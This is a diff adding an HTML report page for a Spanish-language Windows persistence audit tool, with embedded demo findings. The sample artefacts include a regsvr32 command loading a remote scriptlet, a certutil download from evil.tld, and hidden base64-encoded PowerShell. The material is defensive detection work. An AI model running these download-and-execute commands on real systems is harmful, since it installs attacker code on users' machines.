@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Atalaya &mdash; informe de EQUIPO-DEMO</title>
+<style>
+:root {
+  --fondo: #0e1117; --panel: #161b22; --borde: #262d38; --texto: #e6edf3;
+  --suave: #8b949e; --acento: #58a6ff;
+  --limpio: #3fb950; --info: #8b949e; --aviso: #d29922;
+  --sospechoso: #f0883e; --critico: #f85149;
+}
+@media (prefers-color-scheme: light) {
+  :root { --fondo:#f6f8fa; --panel:#fff; --borde:#d0d7de; --texto:#1f2328; --suave:#636c76; }
+}
+* { box-sizing: border-box; }
+body { margin:0; background:var(--fondo); color:var(--texto);
+  font:14px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
+.envoltorio { max-width:1180px; margin:0 auto; padding:28px 20px 80px; }
+header h1 { margin:0 0 4px; font-size:24px; letter-spacing:-.02em; }
+header h1 span { color:var(--acento); }
+.meta { color:var(--suave); font-size:13px; margin-bottom:22px; }
+.meta code { background:var(--panel); padding:1px 6px; border-radius:4px; border:1px solid var(--borde); }
+.tarjetas { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:10px; margin-bottom:24px; }
+.tarjeta { background:var(--panel); border:1px solid var(--borde); border-left-width:4px;
+  border-radius:8px; padding:12px 14px; cursor:pointer; user-select:none; transition:.12s; }
+.tarjeta:hover { transform:translateY(-1px); }
+.tarjeta.apagada { opacity:.35; }
+.tarjeta .n { font-size:26px; font-weight:650; line-height:1.1; }
+.tarjeta .t { font-size:11px; text-transform:uppercase; letter-spacing:.06em; color:var(--suave); }
+.tarjeta[data-n="critico"]{border-left-color:var(--critico)} .tarjeta[data-n="critico"] .n{color:var(--critico)}
+.tarjeta[data-n="sospechoso"]{border-left-color:var(--sospechoso)} .tarjeta[data-n="sospechoso"] .n{color:var(--sospechoso)}
+.tarjeta[data-n="aviso"]{border-left-color:var(--aviso)} .tarjeta[data-n="aviso"] .n{color:var(--aviso)}
+.tarjeta[data-n="info"]{border-left-color:var(--info)} .tarjeta[data-n="info"] .n{color:var(--info)}
+.tarjeta[data-n="limpio"]{border-left-color:var(--limpio)} .tarjeta[data-n="limpio"] .n{color:var(--limpio)}
+.barra { display:flex; gap:10px; margin-bottom:14px; flex-wrap:wrap; }
+input[type=search] { flex:1; min-width:220px; background:var(--panel); color:var(--texto);
+  border:1px solid var(--borde); border-radius:7px; padding:9px 12px; font-size:14px; }
+.aviso-caja { background:var(--panel); border:1px solid var(--borde); border-left:4px solid var(--aviso);
+  border-radius:8px; padding:10px 14px; margin-bottom:18px; font-size:13px; color:var(--suave); }
+.fila { background:var(--panel); border:1px solid var(--borde); border-left-width:4px;
+  border-radius:8px; margin-bottom:7px; overflow:hidden; }
+.fila[data-n="critico"]{border-left-color:var(--critico)}
+.fila[data-n="sospechoso"]{border-left-color:var(--sospechoso)}
+.fila[data-n="aviso"]{border-left-color:var(--aviso)}
+.fila[data-n="info"]{border-left-color:var(--info)}
+.fila[data-n="limpio"]{border-left-color:var(--limpio)}
+.cabecera-fila { display:flex; align-items:center; gap:12px; padding:11px 14px; cursor:pointer; }
+.cabecera-fila:hover { background:rgba(127,127,127,.06); }
+.pts { font-variant-numeric:tabular-nums; font-weight:650; min-width:34px; text-align:right; }
+.origen { font-size:11px; color:var(--suave); text-transform:uppercase; letter-spacing:.05em;
+  min-width:150px; flex-shrink:0; }
+.nombre { font-weight:600; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex-shrink:0; max-width:280px; }
+.ruta { color:var(--suave); font-family:ui-monospace,Consolas,monospace; font-size:12px;
+  overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex:1; direction:rtl; text-align:left; }
+.cuerpo { display:none; padding:4px 14px 16px; border-top:1px solid var(--borde); }
+.fila.abierta .cuerpo { display:block; }
+.senal { padding:9px 0 9px 12px; border-left:2px solid var(--borde); margin:9px 0; }
+.senal.buena { border-left-color:var(--limpio); }
+.senal b { display:block; font-size:13px; }
+.senal small { color:var(--suave); }
+.senal .peso { float:right; font-variant-numeric:tabular-nums; color:var(--suave); font-size:12px; }
+dl { display:grid; grid-template-columns:auto 1fr; gap:2px 14px; margin:12px 0 0; font-size:12.5px; }
+dt { color:var(--suave); }
+dd { margin:0; font-family:ui-monospace,Consolas,monospace; word-break:break-all; }
+table.sec { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
+table.sec th, table.sec td { text-align:left; padding:4px 8px; border-bottom:1px solid var(--borde); }
+table.sec th { color:var(--suave); font-weight:500; }
+.alta { color:var(--sospechoso); font-weight:600; }
+footer { margin-top:32px; color:var(--suave); font-size:12px; text-align:center; }
+.vacio { text-align:center; color:var(--suave); padding:40px; }
+@media (max-width:760px){ .origen,.ruta{display:none} .nombre{max-width:none} }
+</style>
+</head>
+<body>
+<div class="envoltorio">
+<header>
+  <h1><span>Atalaya</span> &mdash; superficie de ejecucion</h1>
+  <div class="meta">
+    <code>EQUIPO-DEMO</code> &middot; usuario <code>analista</code> &middot; 2026-09-03 10:00
+    &middot; 13 artefactos en 28.4 s &middot; ejecutado como administrador
+  </div>
+</header>
+
+<div class="tarjetas" id="tarjetas"></div>
+<div class="barra"><input type="search" id="buscar" placeholder="Filtrar por nombre, ruta, origen o senal..."></div>
+<div id="lista"></div>
+<footer>Atalaya &middot; herramienta de auditoria, no sustituye a un antivirus residente</footer>
+</div>
+<script>
+const DATOS = {"maquina": "EQUIPO-DEMO", "usuario": "analista", "fecha": "2026-09-03 10:00", "admin": true, "duracion": 28.4, "resumen": {"limpio": 2, "info": 1, "aviso": 0, "sospechoso": 4, "critico": 6}, "avisos": [], "artefactos": [{"origen": "Inicio (usuario)", "nombre": "factura.pdf.exe", "comando": "C:\\Users\\ana\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\factura.pdf.exe", "ruta": "C:\\Users\\ana\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\factura.pdf.exe", "detalle": {}, "existe": true, "tamano": 310000, "sha256": null, "firma": {"estado": "NotSigned", "firmante": "", "es_microsoft": false, "confiable": false, "rota": false}, "pe": {"maquina": "x86", "es_dll": false, "subsistema": "GUI", "compilado": "2010-03-04", "compilado_epoch": 1267660800, "aslr": false, "dep": false, "total_funciones": 3, "secciones": [], "seccion_empaquetador": ["upx0", "upx1"], "secciones_raras": [], "entropia_max_ejecutable": 7.85, "seccion_ejecutable_escribible": ["upx1"], "funciones_planas": ["loadlibrarya", "getprocaddress", "exitprocess"]}, "yara": [], "senales": [{"codigo": "SIN_FIRMA_PERSISTENTE", "titulo": "Sin firma digital y con persistencia", "detalle": "Un binario que arranca solo y no esta firmado no puede atribuirse a ningun fabricante. No es concluyente, pero eleva la prioridad de revision.", "puntos": 15, "categoria": "contexto"}, {"codigo": "RUTA_VOLATIL", "titulo": "Se ejecuta desde AppData\\Roaming", "detalle": "Ruta: C:\\Users\\ana\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\factura.pdf.exe. El software instalado normalmente vive en Program Files; las carpetas de usuario y temporales son donde se deja caer el malware.", "puntos": 12, "categoria": "contexto"}, {"codigo": "DOBLE_EXTENSION", "titulo": "Doble extension enganosa", "detalle": "'factura.pdf.exe' aparenta ser un documento pero es un ejecutable.", "puntos": 45, "categoria": "contexto"}, {"codigo": "EMPAQUETADOR", "titulo": "Empaquetador conocido detectado", "detalle": "Secciones: upx0, upx1. El codigo real esta comprimido y solo aparece en memoria al ejecutarse.", "puntos": 35, "categoria": "contenido"}, {"codigo": "SECCION_RWX", "titulo": "Seccion ejecutable y escribible a la vez", "detalle": "Secciones: upx1. Permite que el propio codigo se reescriba en memoria; muy poco habitual en software limpio.", "puntos": 25, "categoria": "contenido"}, {"codigo": "IMPORTS_ANEMICOS", "titulo": "Tabla de importaciones casi vacia", "detalle": "Solo 3 funciones importadas en un ejecutable de 302 KB. Sintoma tipico de codigo empaquetado que resuelve sus llamadas en tiempo de ejecucion.", "puntos": 25, "categoria": "contenido"}, {"codigo": "SIN_MITIGACIONES", "titulo": "Compilado sin ASLR ni DEP", "detalle": "Binario moderno sin mitigaciones basicas de explotacion.", "puntos": 10, "categoria": "contenido"}], "puntos": 167, "nivel": "critico"}, {"origen": "Winlogon (Shell)", "nombre": "Shell", "comando": "explorer.exe, C:\\ProgramData\\wsc.exe", "ruta": "C:\\ProgramData\\wsc.exe", "detalle": {"esperado_por_defecto": "explorer.exe"}, "existe": true, "tamano": 60000, "sha256": null, "firma": {"estado": "NotSigned", "firmante": "", "es_microsoft": false, "confiable": false, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "GUI", "compilado": "2026-01-01", "compilado_epoch": 1767225600, "aslr": true, "dep": true, "total_funciones": 40, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [], "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread", "setthreadcontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}, "yara": [], "senales": [{"codigo": "SIN_FIRMA_PERSISTENTE", "titulo": "Sin firma digital y con persistencia", "detalle": "Un binario que arranca solo y no esta firmado no puede atribuirse a ningun fabricante. No es concluyente, pero eleva la prioridad de revision.", "puntos": 15, "categoria": "contexto"}, {"codigo": "RUTA_VOLATIL", "titulo": "Se ejecuta desde la raiz de ProgramData", "detalle": "Ruta: C:\\ProgramData\\wsc.exe. El software instalado normalmente vive en Program Files; las carpetas de usuario y temporales son donde se deja caer el malware.", "puntos": 22, "categoria": "contexto"}, {"codigo": "VALOR_CRITICO_MODIFICADO", "titulo": "Valor critico del sistema modificado", "detalle": "'Shell' vale «explorer.exe, C:\\ProgramData\\wsc.exe» y de fabrica deberia ser «explorer.exe». Es un punto de secuestro que se ejecuta antes que el escritorio.", "puntos": 55, "categoria": "contexto"}, {"codigo": "API_INYECCION", "titulo": "Importa el juego completo de APIs de inyeccion", "detalle": "Funciones: createremotethread, setthreadcontext, virtualallocex, writeprocessmemory. Es la combinacion que se usa para escribir y ejecutar codigo dentro de otro proceso.", "puntos": 40, "categoria": "contenido"}, {"codigo": "API_ANTIDEPURACION", "titulo": "Importa APIs de deteccion de depurador", "detalle": "Funciones: checkremotedebuggerpresent, isdebuggerpresent.", "puntos": 15, "categoria": "contenido"}], "puntos": 147, "nivel": "critico"}, {"origen": "Tarea programada", "nombre": "\\Microsoft\\Windows\\SvcHost", "comando": "C:\\Users\\ana\\AppData\\Roaming\\svchost.exe", "ruta": "C:\\Users\\ana\\AppData\\Roaming\\svchost.exe", "detalle": {}, "existe": true, "tamano": 90000, "sha256": null, "firma": {"estado": "NotSigned", "firmante": "", "es_microsoft": false, "confiable": false, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "GUI", "compilado": "2026-01-01", "compilado_epoch": 1767225600, "aslr": true, "dep": true, "total_funciones": 40, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [], "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread", "setthreadcontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}, "yara": [], "senales": [{"codigo": "SIN_FIRMA_PERSISTENTE", "titulo": "Sin firma digital y con persistencia", "detalle": "Un binario que arranca solo y no esta firmado no puede atribuirse a ningun fabricante. No es concluyente, pero eleva la prioridad de revision.", "puntos": 15, "categoria": "contexto"}, {"codigo": "RUTA_VOLATIL", "titulo": "Se ejecuta desde AppData\\Roaming", "detalle": "Ruta: C:\\Users\\ana\\AppData\\Roaming\\svchost.exe. El software instalado normalmente vive en Program Files; las carpetas de usuario y temporales son donde se deja caer el malware.", "puntos": 12, "categoria": "contexto"}, {"codigo": "SUPLANTA_SISTEMA", "titulo": "Usa el nombre de un binario del sistema fuera de su sitio", "detalle": "'svchost.exe' deberia estar en System32, no en C:\\Users\\ana\\AppData\\Roaming. Suplantacion de nombre para pasar desapercibido en el administrador de tareas.", "puntos": 60, "categoria": "contexto"}, {"codigo": "API_INYECCION", "titulo": "Importa el juego completo de APIs de inyeccion", "detalle": "Funciones: createremotethread, setthreadcontext, virtualallocex, writeprocessmemory. Es la combinacion que se usa para escribir y ejecutar codigo dentro de otro proceso.", "puntos": 40, "categoria": "contenido"}, {"codigo": "API_ANTIDEPURACION", "titulo": "Importa APIs de deteccion de depurador", "detalle": "Funciones: checkremotedebuggerpresent, isdebuggerpresent.", "puntos": 15, "categoria": "contenido"}], "puntos": 142, "nivel": "critico"}, {"origen": "Registro Run (HKCU)", "nombre": "SystemUpdate", "comando": "C:\\Users\\ana\\AppData\\Local\\Temp\\svc32.exe", "ruta": "C:\\Users\\ana\\AppData\\Local\\Temp\\svc32.exe", "detalle": {}, "existe": true, "tamano": 180000, "sha256": null, "firma": {"estado": "NotSigned", "firmante": "", "es_microsoft": false, "confiable": false, "rota": false}, "pe": {"maquina": "x86", "es_dll": false, "subsistema": "GUI", "compilado": "2010-03-04", "compilado_epoch": 1267660800, "aslr": false, "dep": false, "total_funciones": 3, "secciones": [], "seccion_empaquetador": ["upx0", "upx1"], "secciones_raras": [], "entropia_max_ejecutable": 7.85, "seccion_ejecutable_escribible": ["upx1"], "funciones_planas": ["loadlibrarya", "getprocaddress", "exitprocess"]}, "yara": [], "senales": [{"codigo": "SIN_FIRMA_PERSISTENTE", "titulo": "Sin firma digital y con persistencia", "detalle": "Un binario que arranca solo y no esta firmado no puede atribuirse a ningun fabricante. No es concluyente, pero eleva la prioridad de revision.", "puntos": 15, "categoria": "contexto"}, {"codigo": "RUTA_VOLATIL", "titulo": "Se ejecuta desde AppData\\Local\\Temp", "detalle": "Ruta: C:\\Users\\ana\\AppData\\Local\\Temp\\svc32.exe. El software instalado normalmente vive en Program Files; las carpetas de usuario y temporales son donde se deja caer el malware.", "puntos": 30, "categoria": "contexto"}, {"codigo": "EMPAQUETADOR", "titulo": "Empaquetador conocido detectado", "detalle": "Secciones: upx0, upx1. El codigo real esta comprimido y solo aparece en memoria al ejecutarse.", "puntos": 35, "categoria": "contenido"}, {"codigo": "SECCION_RWX", "titulo": "Seccion ejecutable y escribible a la vez", "detalle": "Secciones: upx1. Permite que el propio codigo se reescriba en memoria; muy poco habitual en software limpio.", "puntos": 25, "categoria": "contenido"}, {"codigo": "IMPORTS_ANEMICOS", "titulo": "Tabla de importaciones casi vacia", "detalle": "Solo 3 funciones importadas en un ejecutable de 175 KB. Sintoma tipico de codigo empaquetado que resuelve sus llamadas en tiempo de ejecucion.", "puntos": 25, "categoria": "contenido"}, {"codigo": "SIN_MITIGACIONES", "titulo": "Compilado sin ASLR ni DEP", "detalle": "Binario moderno sin mitigaciones basicas de explotacion.", "puntos": 10, "categoria": "contenido"}], "puntos": 140, "nivel": "critico"}, {"origen": "Servicio", "nombre": "AdobeUpdateSvc", "comando": "\"C:\\Program Files\\Adobe\\updater.exe\"", "ruta": "C:\\Program Files\\Adobe\\updater.exe", "detalle": {}, "existe": true, "tamano": 2400000, "sha256": null, "firma": {"estado": "HashMismatch", "firmante": "Adobe Inc.", "es_microsoft": false, "confiable": false, "rota": true}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "GUI", "compilado": "2026-01-01", "compilado_epoch": 1767225600, "aslr": true, "dep": true, "total_funciones": 40, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [], "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread", "setthreadcontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}, "yara": [], "senales": [{"codigo": "FIRMA_ALTERADA", "titulo": "Firma digital no coincide con el fichero", "detalle": "El binario esta firmado pero su contenido fue modificado despues de firmarlo. Es el patron clasico de un ejecutable legitimo troyanizado.", "puntos": 65, "categoria": "contexto"}, {"codigo": "API_INYECCION", "titulo": "Importa el juego completo de APIs de inyeccion", "detalle": "Funciones: createremotethread, setthreadcontext, virtualallocex, writeprocessmemory. Es la combinacion que se usa para escribir y ejecutar codigo dentro de otro proceso.", "puntos": 40, "categoria": "contenido"}, {"codigo": "API_ANTIDEPURACION", "titulo": "Importa APIs de deteccion de depurador", "detalle": "Funciones: checkremotedebuggerpresent, isdebuggerpresent.", "puntos": 15, "categoria": "contenido"}], "puntos": 120, "nivel": "critico"}, {"origen": "Registro Run (HKCU)", "nombre": "Updater", "comando": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "ruta": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "detalle": {}, "existe": true, "tamano": 450000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": true, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "consola", "compilado": "2025-06-01", "compilado_epoch": 1748736000, "aslr": true, "dep": true, "total_funciones": 120, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.1, "seccion_ejecutable_escribible": [], "funciones_planas": ["createfilew", "readfile", "writefile", "closehandle"]}, "yara": [], "senales": [{"codigo": "FIRMA_MICROSOFT", "titulo": "Firma valida de Microsoft", "detalle": "Firmado por Microsoft Windows. Binario de plataforma: las heuristicas de contenido quedan anuladas para este artefacto.", "puntos": 0, "categoria": "contexto"}, {"codigo": "LOLBIN", "titulo": "PowerShell con comando codificado en base64", "detalle": "Comando: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "puntos": 45, "categoria": "contexto"}, {"codigo": "LOLBIN", "titulo": "PowerShell oculto o saltandose la politica de ejecucion", "detalle": "Comando: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "puntos": 30, "categoria": "contexto"}], "puntos": 75, "nivel": "critico"}, {"origen": "WMI CommandLineEventConsumer", "nombre": "BotConsumer", "comando": "cmd.exe /c powershell -w hidden -e ZQBjAGgAbwA=", "ruta": null, "detalle": {"clase": "CommandLineEventConsumer"}, "existe": false, "tamano": null, "sha256": null, "firma": null, "pe": null, "yara": [], "senales": [{"codigo": "LOLBIN", "titulo": "PowerShell oculto o saltandose la politica de ejecucion", "detalle": "Comando: cmd.exe /c powershell -w hidden -e ZQBjAGgAbwA=", "puntos": 30, "categoria": "contexto"}, {"codigo": "WMI_SUSCRIPCION", "titulo": "Persistencia por suscripcion WMI", "detalle": "Clase CommandLineEventConsumer. Es un mecanismo sin fichero, invisible para los antivirus que solo escanean disco, y raro en instalaciones limpias.", "puntos": 35, "categoria": "contexto"}], "puntos": 65, "nivel": "sospechoso"}, {"origen": "IFEO Debugger", "nombre": "taskmgr.exe", "comando": "C:\\Windows\\System32\\calc.exe", "ruta": "C:\\Windows\\System32\\calc.exe", "detalle": {"binario_secuestrado": "taskmgr.exe"}, "existe": true, "tamano": 30000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": true, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "consola", "compilado": "2025-06-01", "compilado_epoch": 1748736000, "aslr": true, "dep": true, "total_funciones": 120, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.1, "seccion_ejecutable_escribible": [], "funciones_planas": ["createfilew", "readfile", "writefile", "closehandle"]}, "yara": [], "senales": [{"codigo": "FIRMA_MICROSOFT", "titulo": "Firma valida de Microsoft", "detalle": "Firmado por Microsoft Windows. Binario de plataforma: las heuristicas de contenido quedan anuladas para este artefacto.", "puntos": 0, "categoria": "contexto"}, {"codigo": "IFEO_DEBUGGER", "titulo": "Secuestro por depurador de imagen (IFEO)", "detalle": "Al ejecutar 'taskmgr.exe' Windows lanzara «C:\\Windows\\System32\\calc.exe» en su lugar. Tecnica usada tanto para bloquear antivirus como para persistir.", "puntos": 60, "categoria": "contexto"}], "puntos": 60, "nivel": "sospechoso"}, {"origen": "Tarea programada", "nombre": "\\WindowsUpdateCheck", "comando": "regsvr32.exe /s /n /u /i:http://185.100.87.4/a.sct scrobj.dll", "ruta": "C:\\Windows\\System32\\regsvr32.exe", "detalle": {}, "existe": true, "tamano": 25000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": true, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "consola", "compilado": "2025-06-01", "compilado_epoch": 1748736000, "aslr": true, "dep": true, "total_funciones": 120, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.1, "seccion_ejecutable_escribible": [], "funciones_planas": ["createfilew", "readfile", "writefile", "closehandle"]}, "yara": [], "senales": [{"codigo": "FIRMA_MICROSOFT", "titulo": "Firma valida de Microsoft", "detalle": "Firmado por Microsoft Windows. Binario de plataforma: las heuristicas de contenido quedan anuladas para este artefacto.", "puntos": 0, "categoria": "contexto"}, {"codigo": "LOLBIN", "titulo": "regsvr32 cargando scriptlet remoto (Squiblydoo)", "detalle": "Comando: regsvr32.exe /s /n /u /i:http://185.100.87.4/a.sct scrobj.dll", "puntos": 45, "categoria": "contexto"}], "puntos": 45, "nivel": "sospechoso"}, {"origen": "Registro Run (HKLM)", "nombre": "Cert", "comando": "certutil.exe -urlcache -split -f http://evil.tld/p.exe %TEMP%\\p.exe", "ruta": "C:\\Windows\\System32\\certutil.exe", "detalle": {}, "existe": true, "tamano": 1500000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": true, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "consola", "compilado": "2025-06-01", "compilado_epoch": 1748736000, "aslr": true, "dep": true, "total_funciones": 120, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.1, "seccion_ejecutable_escribible": [], "funciones_planas": ["createfilew", "readfile", "writefile", "closehandle"]}, "yara": [], "senales": [{"codigo": "FIRMA_MICROSOFT", "titulo": "Firma valida de Microsoft", "detalle": "Firmado por Microsoft Windows. Binario de plataforma: las heuristicas de contenido quedan anuladas para este artefacto.", "puntos": 0, "categoria": "contexto"}, {"codigo": "LOLBIN", "titulo": "certutil usado para descargar o decodificar carga util", "detalle": "Comando: certutil.exe -urlcache -split -f http://evil.tld/p.exe %TEMP%\\p.exe", "puntos": 40, "categoria": "contexto"}], "puntos": 40, "nivel": "sospechoso"}, {"origen": "Servicio", "nombre": "AcmeSync", "comando": "\"C:\\Program Files\\Acme\\sync.exe\" --service", "ruta": "C:\\Program Files\\Acme\\sync.exe", "detalle": {}, "existe": true, "tamano": 900000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Acme Software SL", "es_microsoft": false, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "GUI", "compilado": "2026-01-01", "compilado_epoch": 1767225600, "aslr": true, "dep": true, "total_funciones": 40, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [], "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread", "setthreadcontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}, "yara": [], "senales": [{"codigo": "FIRMA_VALIDA", "titulo": "Firma digital valida", "detalle": "Firmado por Acme Software SL, cadena de confianza correcta. Las heuristicas de contenido cuentan al 20%.", "puntos": 0, "categoria": "contexto"}, {"codigo": "API_INYECCION", "titulo": "Importa el juego completo de APIs de inyeccion", "detalle": "Funciones: createremotethread, setthreadcontext, virtualallocex, writeprocessmemory. Es la combinacion que se usa para escribir y ejecutar codigo dentro de otro proceso. (atenuado por firma digital valida)", "puntos": 8, "categoria": "contenido"}, {"codigo": "API_ANTIDEPURACION", "titulo": "Importa APIs de deteccion de depurador", "detalle": "Funciones: checkremotedebuggerpresent, isdebuggerpresent. (atenuado por firma digital valida)", "puntos": 3, "categoria": "contenido"}], "puntos": 8, "nivel": "info"}, {"origen": "Proceso vivo", "nombre": "explorer.exe", "comando": "C:\\Windows\\Explorer.EXE", "ruta": "C:\\Windows\\explorer.exe", "detalle": {}, "existe": true, "tamano": 5000000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": true, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "GUI", "compilado": "2026-01-01", "compilado_epoch": 1767225600, "aslr": true, "dep": true, "total_funciones": 40, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [], "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread", "setthreadcontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}, "yara": [], "senales": [{"codigo": "FIRMA_MICROSOFT", "titulo": "Firma valida de Microsoft", "detalle": "Firmado por Microsoft Windows. Binario de plataforma: las heuristicas de contenido quedan anuladas para este artefacto.", "puntos": 0, "categoria": "contexto"}], "puntos": 0, "nivel": "limpio"}, {"origen": "Servicio", "nombre": "WinDefend", "comando": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe\"", "ruta": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe", "detalle": {}, "existe": true, "tamano": 3000000, "sha256": null, "firma": {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": true, "confiable": true, "rota": false}, "pe": {"maquina": "x64", "es_dll": false, "subsistema": "GUI", "compilado": "2026-01-01", "compilado_epoch": 1767225600, "aslr": true, "dep": true, "total_funciones": 40, "secciones": [], "seccion_empaquetador": [], "secciones_raras": [], "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [], "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread", "setthreadcontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}, "yara": [], "senales": [{"codigo": "FIRMA_MICROSOFT", "titulo": "Firma valida de Microsoft", "detalle": "Firmado por Microsoft Windows. Binario de plataforma: las heuristicas de contenido quedan anuladas para este artefacto.", "puntos": 0, "categoria": "contexto"}], "puntos": 0, "nivel": "limpio"}]};
+const ORDEN = ["critico","sospechoso","aviso","info","limpio"];
+const TITULO = {critico:"Criticos",sospechoso:"Sospechosos",aviso:"Avisos",info:"Informativos",limpio:"Limpios"};
+let activos = new Set(["critico","sospechoso","aviso"]);
+// Un equipo limpio no debe abrir un informe vacio: si no hay nada por encima
+// del umbral, mostramos tambien lo informativo para que quede el inventario.
+if (!DATOS.artefactos.some(a => activos.has(a.nivel))) activos.add("info");
+
+function esc(s){ const d=document.createElement("div"); d.textContent = s==null?"":String(s); return d.innerHTML; }
+
+function tarjetas(){
+  const c = document.getElementById("tarjetas"); c.innerHTML = "";
+  ORDEN.forEach(n => {
+    const total = DATOS.artefactos.filter(a => a.nivel===n).length;
+    const d = document.createElement("div");
+    d.className = "tarjeta" + (activos.has(n) ? "" : " apagada");
+    d.dataset.n = n;
+    d.innerHTML = `<div class="n">${total}</div><div class="t">${TITULO[n]}</div>`;
+    d.onclick = () => { activos.has(n) ? activos.delete(n) : activos.add(n); tarjetas(); pintar(); };
+    c.appendChild(d);
+  });
+}
+
+function detalle(a){
+  let h = "";
+  a.senales.slice().sort((x,y)=>y.puntos-x.puntos).forEach(s => {
+    h += `<div class="senal ${s.puntos<0?"buena":""}">
+      <span class="peso">${s.puntos>0?"+":""}${s.puntos}</span>
+      <b>${esc(s.titulo)}</b><small>${esc(s.detalle)}</small></div>`;
+  });
+  h += "<dl>";
+  h += `<dt>Comando</dt><dd>${esc(a.comando)}</dd>`;
+  if (a.ruta) h += `<dt>Fichero</dt><dd>${esc(a.ruta)}${a.existe?"":" (no existe)"}</dd>`;
+  if (a.sha256) h += `<dt>SHA256</dt><dd>${esc(a.sha256)}</dd>`;
+  if (a.tamano) h += `<dt>Tamano</dt><dd>${(a.tamano/1024).toFixed(1)} KB</dd>`;
+  if (a.firma) h += `<dt>Firma</dt><dd>${esc(a.firma.estado)}${a.firma.firmante?" &mdash; "+esc(a.firma.firmante):""}</dd>`;
+  if (a.pe && !a.pe.error) {
+    h += `<dt>PE</dt><dd>${esc(a.pe.maquina)} &middot; ${esc(a.pe.subsistema)} &middot; ${a.pe.es_dll?"DLL":"EXE"}
+          &middot; compilado ${esc(a.pe.compilado||"?")} &middot; ${a.pe.total_funciones} imports</dd>`;
+  }
+  Object.entries(a.detalle||{}).forEach(([k,v]) => {
+    if (v!==null && v!=="" ) h += `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`;
+  });
+  h += "</dl>";
+  if (a.pe && a.pe.secciones && a.pe.secciones.length) {
+    h += `<table class="sec"><tr><th>Seccion</th><th>Entropia</th><th>Virtual</th><th>Disco</th><th>Flags</th></tr>`;
+    a.pe.secciones.forEach(s => {
+      h += `<tr><td>${esc(s.nombre)}</td>
+        <td class="${s.entropia>=7.2?"alta":""}">${s.entropia}</td>
+        <td>${s.tam_virtual}</td><td>${s.tam_raw}</td>
+        <td>${s.ejecutable?"X":""}${s.escribible?"W":""}</td></tr>`;
+    });
+    h += "</table>";
+  }
+  return h;
+}
+
+function pintar(){
+  const q = document.getElementById("buscar").value.toLowerCase().trim();
+  const lista = document.getElementById("lista");
